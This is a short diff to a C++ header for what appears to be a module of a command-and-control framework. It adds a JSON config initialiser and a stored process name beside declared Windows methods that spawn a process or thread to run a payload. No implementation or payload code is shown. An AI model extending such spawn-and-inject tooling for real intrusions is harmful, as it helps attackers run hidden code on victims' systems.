@@ -17,9 +17,12 @@ public:
 	std::string getInfo();
 
 	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
+	int initConfig(const nlohmann::json &config);
 	int process(C2Message& c2Message, C2Message& c2RetMessage);
 
 private:
+	std::string m_processToSpawn;
+
 #ifdef _WIN32
 	int createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result);
 	int createNewThread(const std::string& payload, std::string& result);
